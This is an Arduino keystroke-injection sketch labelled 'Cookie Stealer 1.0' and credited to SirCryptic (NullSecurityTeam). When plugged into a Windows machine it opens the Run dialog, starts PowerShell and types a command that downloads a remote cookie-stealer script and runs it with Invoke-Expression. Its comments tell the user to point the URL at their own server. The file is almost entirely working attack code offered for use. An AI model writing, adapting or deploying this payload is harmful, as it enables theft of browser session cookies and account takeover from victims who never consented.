#include "Keyboard.h"

  // Developer: SirCryptic (NullSecurityTeam)
  // Info: Cookie Stealer 1.0
  // Usage: Change http://example.com/cookiestealer.ps1 To Your server where the file is hosted
  //

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);
  
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("(New-Object System.Net.WebClient).DownloadString('http://example.com/cookiestealer.ps1') | Invoke-Expression");

  delay(500);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}